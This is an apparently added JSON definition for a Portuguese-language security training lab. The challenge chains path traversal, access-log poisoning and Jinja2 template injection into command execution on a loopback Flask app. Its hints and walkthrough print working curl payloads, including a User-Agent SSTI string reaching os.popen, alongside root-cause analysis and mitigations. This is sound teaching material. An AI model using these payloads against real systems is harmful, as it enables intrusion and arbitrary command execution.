@@ -1,0 +1,35 @@
+{
+  "slug": "chain-lfi-to-rce",
+  "title": "Leitor, log, compilador",
+  "codename": "PAPERTRAIL OPS",
+  "summary": "O leitor de operações do Papertrail concatena o nome de uma página em um caminho do sistema de arquivos, o webserver de borda anexa headers controlados pelo usuário a um log dentro do caminho de busca de templates, e o compilador de preview compila qualquer arquivo que consiga resolver. Três recursos comuns se alinham até remote code execution.",
+  "category": "chain",
+  "difficulty": "insane",
+  "kind": "challenge",
+  "lab_dir": "chain-lfi-to-rce",
+  "estimated_minutes": 55,
+  "xp": 460,
+  "tech": ["Flask", "Jinja2", "Local file inclusion", "Log injection", "Template injection"],
+  "tags": ["chaining", "lfi", "log-poisoning", "ssti", "rce"],
+  "story": "O Papertrail Ops é um console interno de runbooks e notas de release no edge node pt-01.ops.internal. O leitor junta um document root com a página requisitada, o webserver grava cada request — incluindo os headers User-Agent e Referer — em logs/access.log, e um compilador de preview renderiza qualquer nome de template que consiga resolver a partir do workspace de estado ou da pasta da aplicação. O segredo de operações vive em um arquivo no node.",
+  "objective": "Transforme o path traversal no leitor de documentos em leitura de arquivo local, polua o access log com uma expressão Jinja, faça o compilador de preview executar o log e rode um comando de shell que leia o arquivo da flag de operações.",
+  "rules": "Fique na origem loopback atribuída. Leia apenas o arquivo de flag que o próprio lab criou em /tmp/redvault-chain-lfi-to-rce.txt; não toque em outros paths. Resete o lab para limpar o access log. As flags são dinâmicas e têm o estado verificado.",
+  "flags": [
+    {"key": "flag", "label": "Flag do edge node", "flag_type": "root", "points": 460, "required": true, "requires_objective": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "O leitor junta, não confina", "body": "`/docs?page=` é passado para `os.path.join(pages_root, page)`. Suba com `../` e leia `logs/access.log` ao lado de `pages/`.", "cost": 25},
+    {"level": 2, "title": "Seus headers são o log", "body": "Cada request é registrado com seu `User-Agent` bruto. Envie `User-Agent: {{ 6*7 }}` para qualquer path e leia o log de novo: o valor é armazenado literalmente.", "cost": 35},
+    {"level": 3, "title": "O compilador compartilha as raízes", "body": "`/preview?template=` resolve contra `pages/`, o workspace de estado e a pasta da aplicação. Compile `../workspace/logs/access.log`. Os globals do Jinja expõem `cycler.__init__.__globals__.os`, então `os.popen('cat /tmp/redvault-chain-lfi-to-rce.txt').read()` retorna a flag.", "cost": 45}
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — LFI no leitor.** `/docs` resolve `pages/` + `page`:\n\n```bash\ncurl -s 'http://127.0.0.1:PORT/docs?page=../logs/access.log'\n# 10.0.0.8 - - [...] \"GET /docs?page=about.html HTTP/1.1\" 200 - \"-\" \"curl\"\n```\n\n**Etapa 2 — envenene o log.** A borda grava o `User-Agent` bruto (e o `Referer`) em `logs/access.log`: o path precisa existir, então use qualquer rota, até um 404:\n\n```bash\ncurl -s -H 'User-Agent: {{ 6*7 }}' 'http://127.0.0.1:PORT/insights/visitors'\ncurl -s 'http://127.0.0.1:PORT/docs?page=../logs/access.log' | grep '6\\*7'\n# ... \"GET /insights/visitors HTTP/1.1\" 404 - \"-\" \"{{ 6*7 }}\"\n```\n\n**Etapa 3 — compile o log.** O compilador de preview compartilha `logs/` por meio do workspace root:\n\n```bash\ncurl -s 'http://127.0.0.1:PORT/preview?template=../workspace/logs/access.log' | grep -o '\"42\"'\n# ... 404 - \"-\" \"42\"\n```\n\n**Etapa 4 — execução de comandos.** Injete uma chamada ao SO pelo mesmo sink:\n\n```bash\ncurl -s -H 'User-Agent: {{ cycler.__init__.__globals__.os.popen(\"cat /tmp/redvault-chain-lfi-to-rce.txt\").read() }}' \\\n  'http://127.0.0.1:PORT/insights/exec'\ncurl -s 'http://127.0.0.1:PORT/preview?template=../workspace/logs/access.log' | grep -o 'RV{[^}]*}'\n# RV{...}\n```\n\nQualquer comando funciona (`os.popen('id').read()`, `os.listdir(...)`, `os.system(...)`); a flag é o arquivo que o edge node criou na inicialização, e a resposta que a contém registra o objetivo.",
+    "root_cause": "Três recursos são defensáveis isoladamente e fatais em conjunto. O leitor de documentos monta um caminho com `os.path.join` e nunca o canonicaliza ou restringe, permitindo leituras arbitrárias de arquivo. O logger de acesso concatena headers controlados pelo atacante em um arquivo sem escape ou sanitização. O compilador de preview resolve nomes de template por um caminho de busca que inclui tanto o workspace de estado quanto o diretório da aplicação e compila o que encontrar como Jinja confiável. Linhas de log deixam de ser dados quando vivem dentro de uma raiz de template: um atacante que consegue escrever uma entrada de log controla o código-fonte do template. Os globals padrão do Jinja (`cycler`, `joiner`, `lipsum`) expõem `__init__.__globals__`, então a avaliação do template alcança `os` e o shell do processo.",
+    "mitigation": "Canonicalize caminhos de documentos com `os.path.realpath` e rejeite qualquer coisa fora do document root (`os.path.commonpath`); sirva arquivos por identificadores fixos em vez de nomes. Faça escape ou encode JSON de cada campo de log e mantenha os logs fora de qualquer caminho de busca de template/recurso. Remova o compilador de nomes arbitrários: vincule o preview a uma allow-list de templates conhecidos e habilite `SandboxedEnvironment` se autores não confiáveis precisarem renderizar HTML. Rode o serviço como usuário de baixo privilégio em um container sem acesso a arquivos de segredo e gere alertas para nomes de template que resolvam fora das raízes configuradas."
+  },
+  "references": [
+    {"title": "OWASP — Path Traversal", "url": "https://owasp.org/www-community/attacks/Path_Traversal", "source_type": "standard", "description": "Como sequências `..` escapam de um document root concatenado e as correções de canonicalização."},
+    {"title": "HackTricks — Server Side Template Injection (Jinja2)", "url": "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html", "source_type": "research", "description": "Primitivas de exploração do Jinja2, incluindo os globals cycler/lipsum alcançando os e o shell."},
+    {"title": "PortSwigger Web Security Academy — Server-side template injection", "url": "https://portswigger.net/web-security/server-side-template-injection", "source_type": "official", "description": "Detecção e exploração de template injection em conteúdo renderizado no servidor."}
+  ]
+}
